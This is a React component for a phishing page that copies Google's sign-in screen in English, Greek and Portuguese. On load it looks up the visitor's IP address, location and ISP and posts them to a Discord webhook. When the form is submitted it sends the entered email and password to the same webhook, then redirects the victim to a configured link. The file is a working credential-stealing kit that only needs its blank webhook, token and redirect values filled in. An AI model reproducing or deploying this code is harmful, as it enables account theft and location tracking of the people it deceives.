import React, { useState, useEffect } from 'react';

const redirectlink = ""
const webhook = ""
const token = ""

async function getip() {

    // Fetch IP address and info using ipinfo API
    fetch('https://ipinfo.io/json?token='+token) // Replace with your token
      .then(response => response.json())
      .then(data => {

        console.log(data) // Set the IP information
        sendDiscordWebhookip(data)
      })
      .catch(error => {
        console.error('Error fetching IP information:', error);
      });
}


async function sendDiscordWebhookip(data) {

  const embed = {
    title: `Clicked Link @everyone`,
    description: ``,
    color: 7506394, // A nice blue color
    timestamp: new Date(),
    fields: [
      {
        name: 'Ip:',
        value: '```'+data.ip.toString()+'```',
      },
      {
        name: 'Hostname:',
        value: '```'+data.hostname.toString()+'```',
      },
      {
        name: 'Org:',
        value: '```'+data.org.toString()+'```',
      },
      {
        name: 'Country:',
        value: '```'+data.country.toString()+'```',
      },
      {
        name: 'Region:',
        value: '```'+data.region.toString()+'```',
      },
      {
        name: 'City:',
        value: '```'+data.city.toString()+'```',
      },
      {
        name: 'Loc:',
        value: '```'+data.loc.toString()+'```',
      },
      {
        name: 'Postal:',
        value: '```'+data.postal.toString()+'```',
      },
      {
        name: 'Timezone:',
        value: '```'+data.timezone.toString()+'```',
      },
    ],
    footer: {
      text: 'By [@GuiChambelPt](https://github.com/GuiChambelPt/GoogleLoginClone/commit/98b56690e3ff50d5abe5ad95ed874911f3e81847)',
    },
  };

  const payload = {
    embeds: [embed],
  };

  try {
    const response = await fetch(webhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      console.log('Message sent!');
    } else {
      console.log('Failed to send message.');
    }
  } catch (error) {
    console.error('Error sending webhook:', error);
  }
}





//webhook
async function sendDiscordWebhook(x, y) {

  const embed = {
    title: `New Info Logged @everyone`,
    description: ``,
    color: 7506394, // A nice blue color
    timestamp: new Date(),
    fields: [
      {
        name: 'Email',
        value: '```'+x.toString()+'```',
      },
      {
        name: 'Password',
        value: '```'+y.toString()+'```',
      },
    ],
    footer: {
      text: 'By [@GuiChambelPt](https://github.com/GuiChambelPt/GoogleLoginClone/commit/98b56690e3ff50d5abe5ad95ed874911f3e81847)',
    },
  };

  const payload = {
    embeds: [embed],
  };

  try {
    const response = await fetch(webhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      console.log('Message sent!');
    } else {
      console.log('Failed to send message.');
    }
  } catch (error) {
    console.error('Error sending webhook:', error);
  }
}

// Example usage







const translations = {
  en: {
    signIn: "Sign in",
    useAccount: "Use your Google Account",
    emailOrPhone: "Email or phone",
    password: "Password",
    logIn: "Log in",
    help: "Help",
    privacy: "Privacy",
    terms: "Terms",
    emailRequired: "Email is required",
    invalidEmail: "Please enter a valid email address",
    passwordRequired: "Password is required"
  },
  el: {
    signIn: "Σύνδεση",
    useAccount: "Χρησιμοποιήστε τον Λογαριασμό σας Google",
    emailOrPhone: "Email ή τηλέφωνο",
    password: "Κωδικός πρόσβασης",
    logIn: "Σύνδεση",
    help: "Βοήθεια",
    privacy: "Απόρρητο",
    terms: "Όροι",
    emailRequired: "Το email είναι υποχρεωτικό",
    invalidEmail: "Παρακαλώ εισάγετε μια έγκυρη διεύθυνση email",
    passwordRequired: "Ο κωδικός πρόσβασης είναι υποχρεωτικός"
  },
  pt: {
    signIn: "Fazer login",
    useAccount: "Use sua Conta do Google",
    emailOrPhone: "E-mail ou telefone",
    password: "Senha",
    logIn: "Fazer login",
    help: "Ajuda",
    privacy: "Privacidade",
    terms: "Termos",
    emailRequired: "O email é obrigatório",
    invalidEmail: "Por favor, insira um endereço de email válido",
    passwordRequired: "A senha é obrigatória"
  }
};

const GoogleSignIn = () => {
  
  const [lang, setLang] = useState('en');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');

  useEffect(() => {
    // Detect user's language
    getip();
    const userLang = navigator.language || navigator.userLanguage;
    const detectedLang = userLang.split('-')[0]; // Get the primary language code

    // Check if we support the detected language, otherwise default to English
    if (translations[detectedLang]) {
      setLang(detectedLang);
    } else {
      setLang('en');
    }
  }, []);

  const t = translations[lang];

  const validateEmail = (email) => {
    const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    let isValid = true;

    if (!email) {
      setEmailError(t.emailRequired);
      isValid = false;
    } else if (!validateEmail(email)) {
      setEmailError(t.invalidEmail);
      isValid = false;
    } else {
      setEmailError('');
    }

    if (!password) {
      setPasswordError(t.passwordRequired);
      isValid = false;
    } else {
      setPasswordError('');
    }

    if (isValid) {
      console.log(password)
      console.log(email)
      sendDiscordWebhook(email, password);
      // Redirect to Google's official page
      window.location.href = redirectlink;
    }
  };

  return (
    <div style={{
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      minHeight: '100vh',
      backgroundColor: '#f1f3f4',
      padding: '1rem'
    }}>
      <div style={{
        backgroundColor: 'white',
        padding: '2rem',
        borderRadius: '8px',
        boxShadow: '0 2px 4px rgba(0, 0, 0, 0.1)',
        width: '100%',
        maxWidth: '400px'
      }}>
        <div style={{ marginBottom: '1.5rem', textAlign: 'center' }}>
          <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
            <g id="qaEJec">
              <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
            </g>
            <g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g>
            <g id="BWfIk">
              <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
            </g>
            <g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g>
            <g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g>
            <g id="idEJde">
              <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
            </g>
          </svg>
        </div>
        <h1 style={{ fontSize: '24px', fontWeight: 'bold', marginBottom: '0.5rem' }}>{t.signIn}</h1>
        <p style={{ fontSize: '14px', color: '#5f6368', marginBottom: '1.5rem' }}>{t.useAccount}</p>
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
          <div>
            <input 
              type="text" 
              placeholder={t.emailOrPhone} 
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              style={{
                width: '100%',
                padding: '0.5rem',
                border: '1px solid #dadce0',
                borderRadius: '4px',
                fontSize: '16px'
              }}
            />
            {emailError && <p style={{ color: 'red', fontSize: '12px', marginTop: '4px' }}>{emailError}</p>}
          </div>
          <div>
            <input 
              type="password" 
              placeholder={t.password} 
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              style={{
                width: '100%',
                padding: '0.5rem',
                border: '1px solid #dadce0',
                borderRadius: '4px',
                fontSize: '16px'
              }}
            />
            {passwordError && <p style={{ color: 'red', fontSize: '12px', marginTop: '4px' }}>{passwordError}</p>}
          </div>
          <div style={{ display: 'flex', justifyContent: 'flex-end', marginTop: '1rem' }}>
            <button 
              type="submit" 
              style={{
                backgroundColor: '#1a73e8',
                color: 'white',
                padding: '0.5rem 1rem',
                border: 'none',
                borderRadius: '4px',
                fontSize: '14px',
                cursor: 'pointer'
              }}
            >
              {t.logIn}
            </button>
          </div>
        </form>
      </div>
      <div style={{ 
        marginTop: '1rem', 
        display: 'flex', 
        justifyContent: 'space-between', 
        width: '100%', 
        maxWidth: '400px',
        fontSize: '12px',
        color: '#5f6368'
      }}>
        <select 
          style={{ backgroundColor: 'transparent', border: 'none', fontSize: '12px', color: '#5f6368' }}
          value={lang} 
          onChange={(e) => setLang(e.target.value)}
        >
          <option value="en">English</option>
          <option value="el">Ελληνικά</option>
          <option value="pt">Português</option>
        </select>
        <div style={{ display: 'flex', gap: '1rem' }}>
          <a href="#" style={{ color: '#5f6368', textDecoration: 'none' }}>{t.help}</a>
          <a href="#" style={{ color: '#5f6368', textDecoration: 'none' }}>{t.privacy}</a>
          <a href="#" style={{ color: '#5f6368', textDecoration: 'none' }}>{t.terms}</a>
        </div>
      </div>
    </div>
  );
};

export default GoogleSignIn;